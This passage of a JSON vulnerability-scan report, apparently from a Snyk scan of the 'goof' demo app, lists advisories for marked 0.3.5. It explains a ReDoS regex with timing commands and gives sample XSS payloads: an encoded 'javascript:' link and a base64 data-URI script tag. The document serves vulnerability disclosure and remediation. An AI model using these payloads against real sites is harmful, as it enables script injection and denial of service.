/A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 1.1.1 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/commit/bd4f8c464befad2b304d51e33e89e567326e62e0)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/E:U/RL:O/RC:R\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-07-13T15:50:25.938503Z\",\n  \"credit\": [\n    \"Unknown\"\n  ],\n  \"cvssScore\": 5.9,\n  \"description\": \"## Overview\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The `em` regex within `src/rules.js` file have multiple unused capture groups which could lead to a denial of service attack if user input is reachable.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `marked` to version 1.1.1 or higher.\\n## References\\n- [GitHub Commit](https://github.com/markedjs/marked/commit/bd4f8c464befad2b304d51e33e89e567326e62e0)\\n\",\n  \"disclosureTime\": \"2020-07-13T15:47:58Z\",\n  \"exploit\": \"Unproven\",\n  \"fixedIn\": [\n    \"1.1.1\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MARKED-584281\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-1333\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-09-23T16:58:42.707391Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-07-27T15:44:09Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/markedjs/marked/commit/bd4f8c464befad2b304d51e33e89e567326e62e0\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<1.1.1\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@1.1.1\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "79"
            ],
            "cveid": [
              "2016-10531"
            ],
            "ghsaid": [
              "vfvf-mqq8-rwqc"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Cross-site Scripting (XSS)",
          "id": "npm:marked:20150520",
          "desc": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). An attacker could bypass its output sanitization (`sanitize: true`) protection. Using the [HTML Coded Character Set](https://www.w3.org/MarkUp/html-spec/html-spec_13.html#SEC13), attackers can inject `javascript:` code snippets into the output. For example, the following input `javascript&#x58document;alert&#40;1&#41;`  will result in `alert(1)` being executed when the user clicks on the link.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `marked` to version 0.3.6 or higher.\n## References\n- [GitHub Commit](https://github.com/chjj/marked/pull/592/commits/2cff85979be8e7a026a9aca35542c470cf5da523)\n- [GitHub PR](https://github.com/chjj/marked/pull/592)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MARKED-10099\"\n  ],\n  \"creationTime\": \"2016-04-20T14:45:19.556000Z\",\n  \"credit\": [\n    \"Matt Austin\"\n  ],\n  \"cvssScore\": 8.8,\n  \"description\": \"## Overview\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). An attacker could bypass its output sanitization (`sanitize: true`) protection. Using the [HTML Coded Character Set](https://www.w3.org/MarkUp/html-spec/html-spec_13.html#SEC13), attackers can inject `javascript:` code snippets into the output. For example, the following input `javascript&#x58document;alert&#40;1&#41;`  will result in `alert(1)` being executed when the user clicks on the link.\\n## Details\\n\\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\\n\\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\\n\\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\\n\\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\\n \\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \\n\\n### Types of attacks\\nThere are a few methods by which XSS can be manipulated:\\n\\n|Type|Origin|Description|\\n|--|--|--|\\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\\n\\n### Affected environments\\nThe following environments are susceptible to an XSS attack:\\n\\n* Web servers\\n* Application servers\\n* Web application environments\\n\\n### How to prevent\\nThis section describes the top best practices designed to specifically protect your code: \\n\\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \\n* Give users the option to disable client-side scripts.\\n* Redirect invalid requests.\\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\\n\\n## Remediation\\nUpgrade `marked` to version 0.3.6 or higher.\\n## References\\n- [GitHub Commit](https://github.com/chjj/marked/pull/592/commits/2cff85979be8e7a026a9aca35542c470cf5da523)\\n- [GitHub PR](https://github.com/chjj/marked/pull/592)\\n\",\n  \"disclosureTime\": \"2015-05-20T16:45:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.3.6\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lib/marked.js\",\n        \"functionName\": \"unescape\"\n      },\n      \"version\": [\n        \">=0.3.1 <0.3.6\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"lib/marked.js\",\n        \"functionName\": \"unescape\"\n      },\n      \"version\": [\n        \">=0.3.1 <0.3.6\"\n      ]\n    }\n  ],\n  \"id\": \"npm:marked:20150520\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MARKED-10099\"\n    ],\n    \"CVE\": [\n      \"CVE-2016-10531\"\n    ],\n    \"CWE\": [\n      \"CWE-79\"\n    ],\n    \"GHSA\": [\n      \"GHSA-vfvf-mqq8-rwqc\"\n    ],\n    \"NSP\": [\n      \"101\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:08.598700Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:marked:20150520:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.823269Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/marked/20150520/marked_20150520_0_0_2cff85979be8e7a026a9aca35542c470cf5da523.patch\"\n      ],\n      \"version\": \"<=0.3.5 >0.3.3\"\n    },\n    {\n      \"comments\": [\n        \"includes 20140131-1\"\n      ],\n      \"id\": \"patch:npm:marked:20150520:1\",\n      \"modificationTime\": \"2019-12-03T11:40:45.824324Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/marked/20150520/marked_20150520_0_1_2cff85979be8e7a026a9aca35542c470cf5da523_20140131-1.patch\"\n      ],\n      \"version\": \"=0.3.3\"\n    },\n    {\n      \"comments\": [\n        \"includes 20140131-1, 20140131-2\"\n      ],\n      \"id\": \"patch:npm:marked:20150520:2\",\n      \"modificationTime\": \"2019-12-03T11:40:45.825356Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/marked/20150520/marked_20150520_0_2_2cff85979be8e7a026a9aca35542c470cf5da523_20140131-1-2.patch\"\n      ],\n      \"version\": \"<=0.3.2 >0.3.0\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2016-04-20T14:45:19Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/chjj/marked/pull/592/commits/2cff85979be8e7a026a9aca35542c470cf5da523\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/chjj/marked/pull/592\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=0.3.1 <0.3.6\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Cross-site Scripting (XSS)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@0.3.6\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "79"
            ],
            "cveid": [
              "2017-1000427"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Cross-site Scripting (XSS)",
          "id": "npm:marked:20170112",
          "desc": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Data URIs enable embedding small files in line in HTML documents, provided in the URL itself.\r\nAttackers can craft malicious web pages containing either HTML or script code that utilizes the data URI scheme, allowing them to bypass access controls or steal sensitive information.\r\n\r\nAn example of data URI used to deliver javascript code. The data holds `<script>alert('XSS')</script>` tag in base64 encoded format.\r\n```html\r\n[xss link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\r\n```\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `marked` to version 0.3.7 or higher.\n## References\n- [GitHub Commit](https://github.com/chjj/marked/commit/cd2f6f5b7091154c5526e79b5f3bfb4d15995a51)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MARKED-10377\"\n  ],\n  \"creationTime\": \"2017-01-12T00:00:00.780000Z\",\n  \"credit\": [\n    \"Snyk Security Research Team\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Data URIs enable embedding small files in line in HTML documents, provided in the URL itself.\\r\\nAttackers can craft malicious web pages containing either HTML or script code that utilizes the data URI scheme, allowing them to bypass access controls or steal sensitive information.\\r\\n\\r\\nAn example of data URI used to deliver javascript code. The data holds `<script>alert('XSS')</script>` tag in base64 encoded format.\\r\\n```html\\r\\n[xss link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\\r\\n```\\n## Details\\n\\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\\n\\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\\n\\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\\n\\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\\n \\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \\n\\n### Types of attacks\\nThere are a few methods by which XSS can be manipulated:\\n\\n|Type|Origin|Description|\\n|--|--|--|\\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\\n\\n### Affected environments\\nThe following environments are susceptible to an XSS attack:\\n\\n* Web servers\\n* Application servers\\n* Web application environments\\n\\n### How to prevent\\nThis section describes the top best practices designed to specifically protect your code: \\n\\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \\n* Give users the option to disable client-side scripts.\\n* Redirect invalid requests.\\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\\n\\n## Remediation\\nUpgrade `marked` to version 0.3.7 or higher.\\n## References\\n- [GitHub Commit](https://github.com/chjj/marked/commit/cd2f6f5b7091154c5526e79b5f3bfb4d15995a51)\\n\",\n  \"disclosureTime\": \"2017-01-12T00:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.3.7\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"marked.js\",\n        \"functionName\": \"Renderer.prototype.link\"\n      },\n      \"version\": [\n        \"<0.3.7\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"marked.js\",\n        \"functionName\": \"Renderer.prototype.link\"\n      },\n      \"version\": [\n        \"<0.3.7\"\n      ]\n    }\n  ],\n  \"id\": \"npm:marked:20170112\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MARKED-10377\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-1000427\"\n    ],\n    \"CWE\": [\n      \"CWE-79\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:49.371497Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:marked:20170112:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.853095Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/marked/20170112/marked_20170112_0_0_cd2f6f5b7091154c5526e79b5f3bfb4d15995a51.patch\"\n      ],\n      \"version\": \"<=0.3.6 >0.3.3\"\n    }\n  ],\n  \"proprietary\": true,\n  \"publicationTime\": \"2017-01-30T18:00:00Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/chjj/marked/commit/cd2f6f5b7091154c5526e79b5f3bfb4d15995a51\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.3.7\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Cross-site Scripting (XSS)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@0.3.7\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "79"
            ],
            "cveid": [],
            "ghsaid": [
              "8wp3-cp9v-44fm"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Cross-site Scripting (XSS)",
          "id": "npm:marked:20170815",
